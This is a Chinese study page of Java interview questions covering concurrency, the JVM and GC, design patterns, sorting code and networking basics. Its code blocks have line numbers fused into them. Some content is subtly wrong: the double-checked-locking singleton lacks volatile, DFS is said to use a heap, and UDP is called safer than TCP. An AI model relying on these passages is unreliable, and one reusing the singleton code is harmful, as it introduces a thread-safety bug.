AtomicIntegerArray:原子更新整型数组里的元素 AtomicLongArray：原子更新长整型数组里的元素 AtomicReferenceArray：原子更新引用类型数组里的元素 原子更新引用类型 AtomicReference：原子更新引用类型 AtomicReferenceFieldUpdater：原子更新引用类型里的字段 AtomicMarkableReference：原子更新带有标记为的引用类型。可以原子更新一个布尔类型的标记位和引用类型。构造方法是AtomicMarkableReference(V initialRef,boolean initialMark) 原子更新属性类 AtomicIntegerFieldUpdater：原子更新整型的字段的更新器 AtomicLongFieldUpdater：原子更新长整型的字段的更新器 AtomicStampedReference：原子更新带有版本号的引用类型。该类型将整数值与引用关联起来，可用于原子的更新数据和数据的版本号，可以解决使用CAS进行原子更新时可能出现的ABA问题可参考：https://blog.csdn.net/fjse51/article/details/56842777 什么是ABA问题，出现ABA问题JDK是如何解决的 ABA 问题：当第一次读取V的A值, 此时, 内存V的值变为B值, 然后在未执行CAS前, 又变回了A值.JDK的并发包中的AtomicStampedReference和 AtomicMarkableReference来解决。 乐观锁的业务场景及实现方式 乐观锁：比较适合读取操作比较频繁的场景，如果出现大量的写入操作，数据发生冲突的可能性就会增大，为了保证数据的一致性，应用层需要不断的重新获取数据，这样会增加大量的查询操作，降低了系统的吞吐量。 CAS是项乐观锁技术，当多个线程尝试使用CAS同时更新同一个变量时，只有其中一个线程能更新变量的值，而其它线程都失败，失败的线程并不会被挂起，而是被告知这次竞争中失败，并可以再次尝试。CAS 操作包含三个操作数 —— 内存位置（V）、预期原值（A）和新值(B)。如果内存位置的值与预期原值相匹配，那么处理器会自动将该位置值更新为新值。否则，处理器不做任何操作。无论哪种情况，它都会在 CAS 指令之前返回该位置的值。（在 CAS 的一些特殊情况下将仅返回 CAS 是否成功，而不提取当前值。）CAS 有效地说明了“我认为位置 V 应该包含值 A；如果包含该值，则将 B 放到这个位置；否则，不要更改该位置，只告诉我这个位置现在的值即可。”这其实和乐观锁的冲突检查+数据更新的原理是一样的。 可参考：http://www.importnew.com/20472.html Java 8并法包下常见的并发类 ConcurrentHashMapCopyOnWriteArrayListCopyOnWriteArraySetArrayBlockingQueueAtomic ===&gt;AtomicInteger 、AtomicBoolean可参考：https://www.cnblogs.com/longshiyVip/p/5211298.html 偏向锁、轻量级锁、重量级锁、自旋锁的概念 自旋锁原理非常简单，如果持有锁的线程能在很短时间内释放锁资源，那么那些等待竞争锁的线程就不需要做内核态和用户态之间的切换进入阻塞挂起状态，它们只需要等一等（自旋），等持有锁的线程释放锁后即可立即获取锁，这样就避免用户线程和内核的切换的消耗。重量级锁Synchronized,作用于一个对象实例时，锁住的是所有以该对象为锁的代码块。Java偏向锁(Biased Locking)是Java6引入的一项多线程优化。 偏向锁，顾名思义，它会偏向于第一个访问锁的线程，如果在运行过程中，同步锁只有一个线程访问，不存在多线程争用的情况，则线程是不需要触发同步的，这种情况下，就会给线程加一个偏向锁。轻量级锁是由偏向所升级来的，偏向锁运行在一个线程进入同步块的情况下，当第二个线程加入锁争用的时候，偏向锁就会升级为轻量级锁；可参考：https://blog.csdn.net/zqz_zqz/article/details/70233767 写出一个必然会产生死锁的伪代码；123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public class DeadLock &#123; public static String obj1 = &quot;obj1&quot;; public static String obj2 = &quot;obj2&quot;; public static void main(String[] args)&#123; Thread a = new Thread(new Lock1()); Thread b = new Thread(new Lock2()); a.start(); b.start(); &#125; &#125;class Lock1 implements Runnable&#123; @Override public void run()&#123; try&#123; System.out.println(&quot;Lock1 running&quot;); while(true)&#123; synchronized(DeadLock.obj1)&#123; System.out.println(&quot;Lock1 lock obj1&quot;); Thread.sleep(3000);//获取obj1后先等一会儿，让Lock2有足够的时间锁住obj2 synchronized(DeadLock.obj2)&#123; System.out.println(&quot;Lock1 lock obj2&quot;); &#125; &#125; &#125; &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125;class Lock2 implements Runnable&#123; @Override public void run()&#123; try&#123; System.out.println(&quot;Lock2 running&quot;); while(true)&#123; synchronized(DeadLock.obj2)&#123; System.out.println(&quot;Lock2 lock obj2&quot;); Thread.sleep(3000); synchronized(DeadLock.obj1)&#123; System.out.println(&quot;Lock2 lock obj1&quot;); &#125; &#125; &#125; &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 可参考：https://www.cnblogs.com/mudao/p/5867107.html 1.5、JVM 为什么JVM调优经常会将-Xms和-Xmx参数设置成一样； 设置-Xms、-Xmx 相等以避免在每次GC 后调整堆的大小。可参考：http://blog.51cto.com/zhouanya/1370017 JVM运行时内存区域划分 首先Java源代码文件(.java后缀)会被Java编译器编译为字节码文件(.class后缀)，然后由JVM中的类加载器加载各个类的字节码文件，加载完毕之后，交由JVM执行引擎执行。在整个程序执行过程中，JVM会用一段空间来存储程序执行期间需要用到的数据和相关信息，这段空间一般被称作为Runtime Data Area（运行时数据区），也就是我们常说的JVM内存。因此，在Java中我们常常说到的内存管理就是针对这段空间进行管理（如何分配和回收内存空间）。 运行时数据区通常包括这几个部分：程序计数器(Program Counter Register)、Java栈(VM Stack)、本地方法栈(Native Method Stack)、方法区(Method Area)、堆(Heap)。 可参考：http://www.importnew.com/18961.html 内存溢出OOM和堆栈溢出SOE的示例及原因、如何排查与解决 内存溢出是由于没被引用的对象（垃圾）过多造成JVM没有及时回收，造成的内存溢出。如果出现这种现象可行代码排查： 是否应用中的类中和引用变量过多使用了Static修饰 是否 应用 中使用了大量的递归或无限递归 是否使用了大量循环或死循环 检查 应用 中是否使用了向数据库查询所有记录的方法。即一次性全部查询的方法，如果数据量超过10万多条了，就可能会造成内存溢出。所以在查询时应采用“分页查询” 检查是否有数组，List，Map中存放的是对象的引用而不是对象，因为这些引用会让对应的对象不能被释放。会大量存储在内存中。 检查是否使用了“非字面量字符串进行+”的操作。因为String类的内容是不可变的，每次运行”+”就会产生新的对象，如果过多会造成新String对象过多，从而导致JVM没有及时回收而出现内存溢出。 栈溢出的原因一）、是否有递归调用二）、是否有大量循环或死循环三）、全局变量是否过多四）、数组、List、map数据是否过大五）、使用DDMS工具进行查找大概出现栈溢出的位置 可参考：https://my.oschina.net/u/2401092/blog/1621850 如何判断对象是否可以回收或存活,常见的GC算法 引用计数法引用计数法是一种古老的垃圾收集方法，引用计数器实现很简单，对于一个对象A，有任何一个对象引用了A,那么A的计数器+1，引用失效时，A的计数器-1。当A的引用计数器是0的时候。那么A对象就不能被使用了。 标记清除法标记清除算法将垃圾的回收两阶段进行：标记阶段和清除阶段。在标记阶段，顾名思义，就是从根节点开始标记可到达的对象。没有被标记的对象也就是没有被引用的对象那个就是垃圾对象。在第二个阶段也就是清除阶段，清除所有没有被标记的对象。标记清除算法。可能会产生空间的碎片，这也是这个算法的最大的问题。 复制算法复制算法的原理：将分配的内存空间分为2块，每次只是用1块，在垃圾回收呢时，讲正在使用的内存中的存活对象复制到没有被使用的内存的一块，完成之后，清除正在使用的内存块中的所有对象，然后两个内存块交换，以此完成垃圾回收。 标记压缩法压缩算法的使用前提是存活对象少、垃圾对象多的情况下使用。这种情况经常发生在新生代，在老年到就不合适了，因为老年代大部分都是存活对象，如果要使用复制算法，复制的成本很高，所以老年代使用的是其他的算法，老年人比较特殊嘛 分区算法面说的都是出来堆空间的算法，对于栈是如何处理的呢。分区算法是将整个堆空间分成连续的不同的小区间，如下图所示。每一个小区间都是独立使用，独立回收，这样设计可以控制一次回收多少个区间。不回去全扫描。 可参考：https://blog.csdn.net/qq_30739519/article/details/51111328 https://blog.csdn.net/tyronerenekton/article/details/59114835 常见的JVM性能监控和故障处理工具类： jps、jstat、jmap、jinfo、jconsole等 JVM如何设置参数,JVM性能调优 可参考：http://www.cnblogs.com/redcreen/archive/2011/05/04/2037057.html 类加载器、双亲委派模型、一个类的生命周期、类是如何加载到JVM中的 双亲委派机制: 通俗的讲，就是某个特定的类加载器在接到加载类的请求时，首先将加载任务委托给父类加载器，依次递归，如果父类加载器可以完成类加载任务，就成功返回；只有父类加载器无法完成此加载任务时，才自己去加载。可参考：https://www.cnblogs.com/zwjcom/p/6067797.html Java内存模型JMM 可参考https://blog.csdn.net/u011080472/article/details/51337422 Minor GC与Full GC分别在什么时候发生？什么时候触发Full GC; Minor GC ，Full GC 触发条件Minor GC触发条件：当Eden区满时，触发Minor GC。Full GC触发条件：（1）调用System.gc时，系统建议执行Full GC，但是不必然执行（2）老年代空间不足（3）方法去空间不足（4）通过Minor GC后进入老年代的平均大小大于老年代的可用内存（5）由Eden区、From Space区向To Space区复制时，对象大小大于To Space可用内存，则把该对象转存到老年代，且老年代的可用内存小于该对象大小 可参考：https://blog.csdn.net/yhyr_ycy/article/details/52566105 GC收集器有哪些？CMS收集器与G1收集器的特点。 1.serial收集器单线程，工作时必须暂停其他工作线程。多用于client机器上，使用复制算法 2.ParNew收集器serial收集器的多线程版本，server模式下虚拟机首选的新生代收集器。复制算法 3.Parallel Scavenge收集器复制算法，可控制吞吐量的收集器。吞吐量即有效运行时间。 4.Serial Old收集器serial的老年代版本，使用整理算法。 5.Parallel Old收集器第三种收集器的老年代版本，多线程，标记整理 6.CMS收集器目标是最短回收停顿时间。标记清除算法实现，分四个阶段：初始标记：GC Roots直连的对象做标记并发标记：多线程方式GC Roots Tracing重新标记：修正第二阶段标记的记录并发清除。缺点：标记清除算法的缺点，产生碎片。CPU资源敏感。 7.G1收集器基本思想是化整为零，将堆分为多个Region，优先收集回收价值最大的Region。并行并发分代收集空间整合（标记整理算法）可预测的停顿 rt.jar被什么类加载器加载，什么时间加载； 启动类加载器（Bootstrap ClassLoader）加载，启动的时候加载的。可参考：https://www.jianshu.com/p/2133558b4735 为什么新生代内存需要有两个Survivor区？ 设置两个Survivor区最大的好处就是解决了碎片化,新生代使用的是复制收集算法，两个Survivor区是为了配合复制收集算法，因为这种复制算法保证了S1中来自S0和Eden两部分的存活对象占用连续的内存空间，避免了碎片化的发生可参考：https://stackoverflow.com/questions/21476348/java-gc-why-two-survivor-spaceshttps://segmentfault.com/q/1010000006886669?_ea=1165966 G1停顿吗，CMS回收步骤，CMS为什么会停顿，停顿时间； 会吗？我也不知道 栈主要存的数据是什么，堆呢？ 堆区:（存放所有new出来的对象；）栈区:（存放基本类型的变量数据和对象的应用，对象（new出来的对象）本身并不存在栈中，而是存放在堆中或者常量池中（字符串常量对象存放在常量池中）） 参考：https://www.cnblogs.com/w-wfy/p/6412593.html 堆分为哪几块，比如说新生代老生代，那么新生代又分为什么？ 堆大小 = 新生代 + 老年代。默认下，新生代 ( Young ) = 1/3 的堆空间大小，老年代 ( Old ) = 2/3 的堆空间大小；新生代 ( Young ) 被细分为 Eden 和 两个 Survivor 区域，这两个 Survivor 区域分别被命名为 from 和 to，以示区分。默认的，Edem : from : to = 8 : 1 : 1； 参考：https://blog.csdn.net/u012102536/article/details/58587090 1.6、设计模式 常见的设计模式 设计模式六大原则 单一职责原则定义：不要存在多于一个导致类变更的原因。通俗的说，即一个类只负责一项职责。遵循单一职责原的优点有： 可以降低类的复杂度，一个类只负责一项职责，其逻辑肯定要比负责多项职责简单的多； 提高类的可读性，提高系统的可维护性； 变更引起的风险降低，变更是必然的，如果单一职责原则遵守的好，当修改一个功能时，可以显著降低对其他功能的影响。可参考文章：https://blog.csdn.net/zhengzhb/article/details/7278174 里氏替换原则定义：所有引用基类的地方必须能透明地使用其子类的对象。通俗讲就是：子类可以扩展父类的功能，但不能改变父类原有的功能 依赖倒置原则定义：高层模块不应该依赖低层模块，二者都应该依赖其抽象；抽象不应该依赖细节；细节应该依赖抽象。依赖倒置原则的核心就是要我们面向接口编程，理解了面向接口编程，也就理解了依赖倒置通俗的讲就是：降低类之间的耦合性，提高系统的稳定性 接口隔离原则定义：客户端不应该依赖它不需要的接口；一个类对另一个类的依赖应该建立在最小的接口上。简单的说就是：将臃肿的接口拆分为独立的几个接口，提高内聚，减少对外交互，接口尽量小，但是要有限度。但是如果过小，则会造成接口数量过多，使设计复杂化。所以一定要适度。 迪米特法则定义：一个对象应该对其他对象保持最少的了解。通俗讲就是：尽量降低类与类之间的耦合。 开闭原则定义：一个软件实体如类、模块和函数应该对扩展开放，对修改关闭。简单理解：当软件需要变化时，尽量通过扩展软件实体的行为来实现变化，而不是通过修改已有的代码来实现变化。写得不错的博客文章：https://blog.csdn.net/zhengzhb/article/details/7296944 常见的单例模式以及各种实现方式的优缺点，哪一种最好，手写常见的单利模式 饿汉式：单例实例在类装载时就构建，急切初始化。优点 1.线程安全 2.在类加载的同时已经创建好一个静态对象，调用时反应速度快 缺点 资源效率不高，可能getInstance()永远不会执行到，但执行该类的其他静态方法或者加载了该类（class.forName)，那么这个实例仍然初始化 12345678public class Test &#123; private Test() &#123; &#125; public static Test instance = new Test(); public Test getInstance() &#123; return instance; &#125;&#125; 懒汉式：单例实例在第一次被使用时构建，延迟初始化优点： 避免了饿汉式的那种在没有用到的情况下创建事例，资源利用率高，不执行getInstance()就不会被实例，可以执行该类的其他静态方法。缺点： 懒汉式在单个线程中没有问题，但多个线程同事访问的时候就可能同事创建多个实例，而且这多个实例不是同一个对象，虽然后面创建的实例会覆盖先创建的实例，但是还是会存在拿到不同对象的情况。解决这个问题的办法就是加锁synchonized，第一次加载时不够快，多线程使用不必要的同步开销大 12345678910111213141516class Test &#123; private Test() &#123; &#125; public static Test instance = null; public static Test getInstance() &#123; if (instance == null) &#123; synchronized (Test.class) &#123; if (instance == null) &#123; instance = new Test(); &#125; &#125; &#125; return instance; &#125;&#125; 设计模式在实际场景中的应用 Spring中用到了哪些设计模式 工厂模式，这个很明显，在各种BeanFactory以及ApplicationContext创建中都用到了代理模式，在Aop实现中用到了JDK的动态代理单例模式，这个比如在创建bean的时候。原型模式：使用原型模式创建对象比直接new一个对象在性能上好得多，因为Object类的clone()方法是一个native方法，它直接操作内存中的二进制流，特别是复制大对象时，性能的差别非常明显。模版模式，这个也很明显，在各种BeanFactory以及ApplicationContext实现中也都用到了 MyBatis中用到了哪些设计模式 一、装饰模式二、建造者模式三、工厂方法四、适配器模式五、模板方法六、动态代理7、责任链模式 你项目中有使用哪些设计模式 看你个人了 说说常用开源框架中设计模式使用分析 开放性 动态代理很重要！！！ 真的重要，非常重要 1.7、数据结构 树（二叉查找树、平衡二叉树、红黑树、B树、B+树） 参考：https://www.cnblogs.com/miachel-zheng/p/8485408.html 深度有限算法、广度优先算法 深度优先搜索算法（Depth-First-Search），是搜索算法的一种。它沿着树的深度遍历树的节点，尽可能深的搜索树的分 支。当节点v的所有边都己被探寻过，搜索将回溯到发现节点v的那条边的起始节点。这一过程一直进行到已发现从源节点可达的所有节点为止。如果还存在未被发 现的节点，则选择其中一个作为源节点并重复以上过程，整个进程反复进行直到所有节点都被访问为止。DFS属于盲目搜索。深度优先搜索是图论中的经典算法，利用深度优先搜索算法可以产生目标图的相应拓扑排序表，利用拓扑排序表可以方便的解决很多相关的图论问题，如最大路径问题等等。一般用堆数据结构来辅助实现DFS算法。 广度优先搜索算法（Breadth-First-Search），是一种图形搜索算法。简单的说，BFS是从根节点开始，沿着树(图)的宽度遍历树(图)的节点。如果所有节点均被访问，则算法中止。BFS同样属于盲目搜索。一般用队列数据结构来辅助实现BFS算法。参考:https://blog.csdn.net/u013372487/article/details/72082059 克鲁斯卡尔算法、普林母算法、迪克拉斯算法 算法这东西对笔者来说，好高级。有几篇文章，感觉还行https://blog.csdn.net/ljj583905183/article/details/41723699、https://blog.csdn.net/u014507083/article/details/71198946 什么是一致性Hash及其原理、Hash环问题 其原理是通过使用与对象存储一样的Hash算法将机器也映射到环中（一般情况下对机器的hash计算是采用机器的IP或者机器唯一的别名作为输入值），然后以顺时针的方向计算，将所有对象存储到离自己最近的机器中可参考：https://blog.csdn.net/cywosp/article/details/23397179/ 常见的排序算法和查找算法 快排、折半查找、堆排序等 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181/**冒泡排序*/public static void bubbleSort()&#123; int[] score = &#123;20,2,10,8,12,17,4,25,11,6,33,13,24&#125;; //冒泡排序 for (int i = 0; i &lt; score.length -1; i++)&#123; //最多做n-1趟排序 for(int j = 0 ;j &lt; score.length - i - 1; j++)&#123; //对当前无序区间score[0......length-i-1]进行排序 //(j的范围很关键，这个范围是在逐步缩小的) if(score[j] &gt; score[j + 1])&#123; //把小的值交换到后面 int temp = score[j]; score[j] = score[j + 1]; score[j + 1] = temp; &#125; &#125; &#125; System.out.print(&quot;最终排序结果：&quot;); for(int a = 0; a &lt; score.length; a++)&#123; System.out.print(score[a] + &quot;,&quot;); &#125;&#125;/**快速排序*/public static void sort(int[] a,int low,int high)&#123; int start = low; int end = high; int key = a[low]; while(end&gt;start)&#123; //从后往前比较 while(end&gt;start&amp;&amp;a[end]&gt;=key) //如果没有比关键值小的，比较下一个，直到有比关键值小的交换位置，然后又从前往后比较 end--; if(a[end]&lt;=key)&#123; int temp = a[end]; a[end] = a[start]; a[start] = temp; &#125; //从前往后比较 while(end&gt;start&amp;&amp;a[start]&lt;=key)//如果没有比关键值大的，比较下一个，直到有比关键值大的交换位置 start++; if(a[start]&gt;=key)&#123; int temp = a[start]; a[start] = a[end]; a[end] = temp; &#125; //此时第一次循环比较结束，关键值的位置已经确定了。左边的值都比关键值小，右边的值都比关键值大，但是两边的顺序还有可能是不一样的，进行下面的递归调用 &#125; //递归 if(start&gt;low) sort(a,low,start-1);//左边序列。第一个索引位置到关键值索引-1 if(end&lt;high) sort(a,end+1,high);//右边序列。从关键值索引+1到最后一个&#125;/**选择排序*/public static void choseSort()&#123; int[] toBeSorted = &#123;20,2,10,8,12,17,4,25,11,6,33,13,24&#125;; for(int i = 0; i &lt; toBeSorted.length; i++)&#123; for(int j = i+1; j &lt; toBeSorted.length; j++)&#123; if(toBeSorted[i] &gt; toBeSorted[j])&#123; int temp = toBeSorted[i]; toBeSorted[i] = toBeSorted[j]; toBeSorted[j] = temp; &#125; &#125; &#125; for(int i = 0; i &lt;toBeSorted.length; i++)&#123; System.out.print(toBeSorted[i]+&quot;,&quot;); &#125;&#125;/**插入排序*/public static void nsertSort()&#123; int[] arr = &#123;20,2,10,8,12,17,4,25,11,6,33,13,24&#125;; int i, j; int n = arr.length; int target; //假定第一个元素被放到了正确的位置上 //这样，仅需遍历1 - n-1 for (i = 1; i &lt; n; i++)&#123; j = i; target = arr[i]; while (j &gt; 0 &amp;&amp; target &lt; arr[j - 1])&#123; arr[j] = arr[j - 1]; j--; &#125; arr[j] = target; &#125; for(int a = 0; a &lt; arr.length; a++)&#123; System.out.print(arr[a] + &quot;,&quot;); &#125;&#125;/**顺序查找*/public static void sequential()&#123; int[] arr = &#123;20,2,10,8,12,17,4,25,11,6,33,13,24&#125;; int key = 6; for(int i=0;i&lt;arr.length;i++)&#123; if(key == arr[i])&#123; System.out.print(&quot;第&quot;+(i+1)+&quot;个&quot;); &#125; &#125;&#125;/**折半查找*/public static void binarySearch()&#123; int[] arr = &#123;20,2,10,8,12,17,4,25,11,6,33,13,24&#125;; int low = 0; int high = arr.length - 1; int key = 6; while ((low &lt;= high) &amp;&amp; (low &lt;= arr.length - 1) &amp;&amp; (high &lt;= arr.length - 1)) &#123; int middle = (high + low) &gt;&gt; 1; if (key == arr[middle]) &#123; System.out.print(&quot;第&quot;+(middle+1)+&quot;个&quot;); break; &#125; else if (key &lt; arr[middle]) &#123; high = middle - 1; &#125; else &#123; low = middle + 1; &#125; &#125;&#125;/** * @auther Created by chengxiao on 2016/12/17. * @link https://www.cnblogs.com/chengxiao/p/6129630.html * 堆排序demo */public class HeapSort &#123; public static void main(String []args)&#123; int []arr = &#123;9,8,7,6,5,4,3,2,1&#125;; sort(arr); System.out.println(Arrays.toString(arr)); &#125; public static void sort(int []arr)&#123; //1.构建大顶堆 for(int i=arr.length/2-1;i&gt;=0;i--)&#123; //从第一个非叶子结点从下至上，从右至左调整结构 adjustHeap(arr,i,arr.length); &#125; //2.调整堆结构+交换堆顶元素与末尾元素 for(int j=arr.length-1;j&gt;0;j--)&#123; swap(arr,0,j);//将堆顶元素与末尾元素进行交换 adjustHeap(arr,0,j);//重新对堆进行调整 &#125; &#125; /** * 调整大顶堆（仅是调整过程，建立在大顶堆已构建的基础上） * @param arr * @param i * @param length */ public static void adjustHeap(int []arr,int i,int length)&#123; int temp = arr[i];//先取出当前元素i for(int k=i*2+1;k&lt;length;k=k*2+1)&#123;//从i结点的左子结点开始，也就是2i+1处开始 if(k+1&lt;length &amp;&amp; arr[k]&lt;arr[k+1])&#123;//如果左子结点小于右子结点，k指向右子结点 k++; &#125; if(arr[k] &gt;temp)&#123;//如果子节点大于父节点，将子节点值赋给父节点（不用进行交换） arr[i] = arr[k]; i = k; &#125;else&#123; break; &#125; &#125; arr[i] = temp;//将temp值放到最终的位置 &#125; /** * 交换元素 * @param arr * @param a * @param b */ public static void swap(int []arr,int a ,int b)&#123; int temp=arr[a]; arr[a] = arr[b]; arr[b] = temp; &#125;&#125; 怎么解决Hash冲突； 开放地址法、链地址法、再哈希法、建立公共溢出区等 说一下TreeMap的实现原理？红黑树的性质？红黑树遍历方式有哪些？如果key冲突如何解决？setColor()方法在什么时候用？什么时候会进行旋转和颜色转换？ TreeMap是一个有序的key-value集合，基于红黑树(Red-Black tree)实现。该映射根据其键的自然顺序进行排序，或者根据创建时提供的Comparator进行排序、可参考：https://blog.csdn.net/itmyhome1990/article/details/76213883、https://blog.csdn.net/u010853261/article/details/54312932 1.8、网络/IO基础 HTTP请求的GET与POST方式的区别 GET方法：使用GET方法时，查询字符串（键值对）被附加在URL地址后面一起发送到服务器：/test/demo_form.jsp?name1=value1&amp;name2=value2特点：GET请求能够被缓存GET请求会保存在浏览器的浏览记录中以GET请求的URL能够保存为浏览器书签GET请求有长度限制GET请求主要用以获取数据 POST方法：使用POST方法时，查询字符串在POST信息中单独存在，和HTTP请求一起发送到服务器：POST/test/demo_form.jsp HTTP/1.1Host:w3schools.comname1=value1&amp;name2=value2特点：POST请求不能被缓存下来POST请求不会保存在浏览器浏览记录中以POST请求的URL无法保存为浏览器书签POST请求没有长度限制 BIO、NIO、AIO的概念 JAVA BIO :同步并阻塞，服务器实现模式为一个连接一个线程，即客户端有连接请求时服务器端就需要启动一个线程进行处理，如果这个连接不做任何事情会造成不必要的线程 Java NIO ： 同步非阻塞，服务器实现模式为一个请求一个线程，即客户端发送的连接请求都会注册到多路复用器上，多路复用器轮询到连接有I/O请求时才启动一个线程进行处理。 Java AIO(NIO.2) ： 异步非阻塞，服务器实现模式为一个有效请求一个线程，客户端的I/O请求都是由OS先完成了再通知服务器应用去启动线程进行处理， NIO方式适用于连接数目多且连接比较短（轻操作）的架构，比如聊天服务器，并发局限于应用中，编程比较复杂，JDK1.4开始支持。 AIO方式使用于连接数目多且连接比较长（重操作）的架构，比如相册服务器，充分调用OS参与并发操作，编程比较复杂，JDK7开始支持 可参考：https://www.cnblogs.com/barrywxx/p/8430790.html HTTP、TCP、UDP的区别和联系； TCPTCP是传输层的一个协议，基于IP协议，用来传输类似HTTP的信息。如果把IP协议类比为一个“公路”的话，那TCP协议可以看成是在公路上行驶的“卡车”。TCP协议是面向连接的协议，通过三次握手机制，尽量保证连接的可靠性。TCP三次握手机制第一次：客户端发送一个SYN包到服务端，并进入SYN_SEND状态，等待服务端的响应。第二次：服务端收到SYN包，并确认，同时自己也发送一个SYN包，即SYN+ACK包，此时服务端进入SYN_RECV状态。第三次：客户端收到服务端的SYN+ACK包，向服务端发送一个确认ACK包，进入ESTABLISHED状态，完成连接。 UDPUDP也是传输层的一个协议。但是与TCP不同的是，UDP不是面向连接的，并不保证传输的可靠性，没有TCP的建立连接的三次握手机制，对于传输效率上面有了提升。 HTTPHTTP是在应用层的一个协议，本身就是一个协议，是从Web服务器传输超文本到本地浏览器的传输协议。HTTP协议基于请求\响应模型的，并且是基于TCP协议的。 TCP和UDP各自的优势，知道哪些使用UDP协议的成功案例； TCP的优点：可靠，稳定TCP的可靠体现在TCP在传递数据之前，会有三次握手来建立连接，而且在数据传递时，有确认、窗口、重传、拥塞控制机制，在数据传完后，还会断开连接用来节约系统资源。 TCP的缺点：慢，效率低，占用系统资源高，易被攻击TCP在传递数据之前，要先建连接，这会消耗时间，而且在数据传递时，确认机制、重传机制、拥塞控制机制等都会消耗大量的时间，而且要在每台设备上维护所有的传输连接，事实上，每个连接都会占用系统的CPU、内存等硬件资源。而且，因为TCP有确认机制、三次握手机制，这些也导致TCP容易被人利用，实现DOS、DDOS、CC等攻击。 UDP的优点：快，比TCP稍安全UDP没有TCP的握手、确认、窗口、重传、拥塞控制等机制，UDP是一个无状态的传输协议，所以它在传递数据时非常快。没有TCP的这些机制，UDP较TCP被攻击者利用的漏洞就要少一些。但UDP也是无法避免攻击的，比如：UDP Flood攻击…… UDP的缺点：不可靠，不稳定因为UDP没有TCP那些可靠的机制，在数据传递时，如果网络质量不好，就会很容易丢包。 参考：https://blog.csdn.net/yakerwei/article/details/19342977、https://blog.csdn.net/xiaobangkuaipao/article/details/76793702 TCP和UDP各用了底层什么协议； TCP/IP五层模型的协议应用层传输层：四层交换机、也有工作在四层的路由器网络层：路由器、三层交换机数据链路层：网桥（现已很少使用）、以太网交换机（二层交换机）、网卡（其实网卡是一半工作在物理层、一半工作在数据链路层）物理层：中继器、集线器、还有我们通常说的双绞线也工作在物理层 UDP 底层是传输层协议可参考:http://blog.chinaunix.net/uid-22166872-id-3716751.html 单个UDP报文最大容量； 每个udp包的最大大小是多少? 65507 约等于 64K 为什么最大是65507? 因为udp包头有2个byte用于记录包体长度. 2个byte可表示最大值为: 2^16-1=64K-1=65535 udp包头占8字节, ip包头占20字节, 65535-28 = 65507 如果要发送的udp报文大于65507怎么办? 需要在应用层由开发者自己分片发送. 分片的粒度最大65507字节. 系统的sendto函数是不支持大于65507字节的单包发送的. 单个TCP报文最大容量； 以太网Ethernet最大的数据帧是1518字节,(以太网帧的帧头14字节和帧尾CRC校验4字节（共占18字节），剩下承载上层协议的地方也就是Data域最大就只剩1500字节. 这个值我们就把它称之为MTU),单个TCP包实际传输的最大量就缩减为1448字节。1448=1500-20（IP头）-32（20字节TCP头和12字节TCP选项时间戳）参考:https://blog.csdn.net/qq_30667875/article/details/71216281 TCP报头格式、UDP报头格式； UDP报文: 源端口 目的端口 长度 校验和 数据部分 TCP报文： 端口号 源端口 目的端口 序号和确认号 数据偏移／首部长度 保留 控制位 窗口 校验和 紧急指针 选项和填充 数据部分可参考：https://www.cnblogs.com/Allen-rg/p/7190042.html Server遭遇SYN Flood应当怎么处理； SYN Flood是一种广为人知的DoS（拒绝服务攻击）是DDoS（分布式拒绝服务攻击）的方式之一，这是一种利用TCP协议缺陷，发送大量伪造的TCP连接请求，从而使得被攻击方资源耗尽（CPU满负荷或内存不足）的攻击方式。 防御措施 （1）使用TCP Wrapper，服务端只处理有限来源IP的TCP连接请求，其它未指定来源的连接请求一概拒绝。 （2）缩短SYN Timeout时间， （3）设置SYN Cookie， （4）使用SYN Proxy防火墙 可参考：https://www.cnblogs.com/qiaoconglovelife/p/5713661.html、 Web开发中如何防范XSS？ 转义特殊符号，比如：‘&lt;’ ‘&gt;’ ，转义后就会变成 ：‘&lt;’ ‘&amp;gt’ 过滤 html 标签 拆包和粘包的问题，如何解决，如果我们的包没有固定长度的话，我们的应用程序应该如何解决； 这个也是开放题，我以前遇到过是这样解决的。每次发包，数据包= 包头+ 包数据体。这个比较简单，包头我直接放入这个数据包的数据大小，包头可以固定2个字节这样（看需求），服务端首先读取包头的数据，判断该包是否接受完，为接受完就继续等待… 什么是长连接和短连接 在HTTP/1.0中默认使用短连接。也就是说，客户端和服务器每进行一次HTTP操作，就建立一次连接，任务结束就中断连接。当客户端浏览器访问的某个HTML或其他类型的Web页中包含有其他的Web资源（如JavaScript文件、图像文件、CSS文件等），每遇到这样一个Web资源，浏览器就会重新建立一个HTTP会话。 而从HTTP/1.1起，默认使用长连接，用以保持连接特性。使用长连接的HTTP协议，会在响应头加入这行代码： Connection:keep-alive在使用长连接的情况下，当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关闭，客户端再次访问这个服务器时，会继续使用这一条已经建立的连接。Keep-Alive不会永久保持连接，它有一个保持时间，可以在不同的服务器软件（如Apache）中设定这个时间。实现长连接需要客户端和服务端都支持长连接。 HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。 参考：【https://www.cnblogs.com/gotodsp/p/6366163.html】 Http1.0和2.0相比有什么区别，可参考《Http 2.0》 HTTP1.0的缺陷每个请求都需单独建立连接（keep-alive能解决部分问题单不能交叉推送）每个请求和响应都需要完整的头信息数据未加密 HTTP2.0的优势多路复用压缩头信息请求划分优先级支持服务器端主动推送 可参考：http://www.ruanyifeng.com/blog/2016/08/http.html Https的基本概念 HTTPS (基于安全套接字层的超文本传输协议 或者是 HTTP over SSL) 是一个 Netscape 开发的 Web 协议。你也可以说：HTTPS = HTTP + SSLHTTPS 在 HTTP 应用层的基础上使用安全套接字层作为子层。可参考：https://blog.csdn.net/xhbxhbsq/article/details/79385179 三次握手和四次挥手、为什么挥手需要四次 因为HTTP是一个基于TCP的协议,而TCP是一种可靠的传输层协议.建立TCP连接时会发生:三次握手(three-way handshake)firefox &gt; nginx [SYN] 在么nginx &gt; firefox [SYN, ACK] 在firefox &gt; nginx [ACK] 知道了 关闭TCP连接时会发生:四次挥手(four-way handshake)firefox &gt; nginx [FIN] 我要关闭连接了nginx &gt; firefox [ACK] 知道了,等我发完包先nginx &gt; firefox [FIN] 我也关闭连接了firefox &gt; nginx [ACK] 好的,知道了 